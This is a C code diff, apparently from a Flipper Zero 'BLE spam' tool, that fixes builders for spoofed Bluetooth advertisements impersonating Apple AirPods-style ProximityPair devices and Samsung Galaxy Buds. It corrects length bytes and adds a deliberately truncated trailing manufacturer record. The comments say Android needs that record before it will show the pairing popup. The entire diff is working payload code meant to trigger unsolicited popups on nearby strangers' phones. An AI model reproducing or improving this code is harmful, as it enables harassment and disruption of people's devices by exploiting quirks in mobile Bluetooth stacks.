@@ -391,8 +391,8 @@ static const BleSpamSamsungWatch samsung_watches[] = {
  */
 static inline uint8_t ble_spam_build_apple_proximity(uint8_t* buf, uint16_t device_id) {
     uint8_t i = 0;
-    /* Manufacturer Specific Data: length=0x1B (27), type=0xFF, Apple=0x004C LE */
-    buf[i++] = 0x1B; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    /* Manufacturer Specific Data: length=0x1E (30 = following bytes), type=0xFF, Apple=0x004C LE */
+    buf[i++] = 0x1E; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
     /* Continuity type: ProximityPair */
     buf[i++] = 0x07;
     /* Payload size */
@@ -409,7 +409,7 @@ static inline uint8_t ble_spam_build_apple_proximity(uint8_t* buf, uint16_t devi
     buf[i++] = 0x00; /* color */
     buf[i++] = 0x00; /* reserved */
     furi_hal_random_fill_buf(&buf[i], 16); i += 16;
-    return i; /* 28 */
+    return i; /* 31 */
 }
 
 /**
@@ -548,21 +548,15 @@ static inline uint8_t ble_spam_build_swiftpair_headphone(uint8_t* buf, const cha
 /**
  * Samsung Easy Setup -- Buds.
  *
- * Layout (31 bytes):
- *   [0..2]   02 01 06                       -- AD Flags
- *   [3]      1B                             -- Manuf. AD length (27)
- *   [4]      FF                             -- AD type: Manufacturer Specific
- *   [5..6]   75 00                          -- Samsung company ID (0x0075 LE)
- *   [7..16]  42 09 81 02 14 15 03 21 01 09  -- Buds header (10 bytes)
- *   [17..18] R  G                           -- Color R, G
- *   [19]     01                             -- Separator
- *   [20]     B                              -- Color B
- *   [21..30] 06 3C 94 8E 00 00 00 00 C7 00  -- Buds tail (10 bytes)
+ * Ghost/Flipper format (31 bytes): primary 28-byte manuf record + a trailing
+ * truncated 2nd manuf record that Android's stack completes with zeros.
+ * Without this trailer Android's Galaxy Wearable stack won't raise the popup.
  *
  * Returns: 31
  */
 static inline uint8_t ble_spam_build_samsung_buds(uint8_t* buf, uint8_t r, uint8_t g, uint8_t b) {
     uint8_t i = 0;
+    /* Primary record: length=27 (0x1B), manufacturer-specific Samsung */
     buf[i++] = 0x1B; buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
     buf[i++] = 0x42; buf[i++] = 0x09; buf[i++] = 0x81; buf[i++] = 0x02;
     buf[i++] = 0x14; buf[i++] = 0x15; buf[i++] = 0x03; buf[i++] = 0x21;
@@ -571,7 +565,9 @@ static inline uint8_t ble_spam_build_samsung_buds(uint8_t* buf, uint8_t r, uint8
     buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
     buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
     buf[i++] = 0xC7; buf[i++] = 0x00;
-    return i;
+    /* Trailing truncated record: length=16 claimed, only 2 data bytes present */
+    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75;
+    return i; /* 31 */
 }
 
 /**
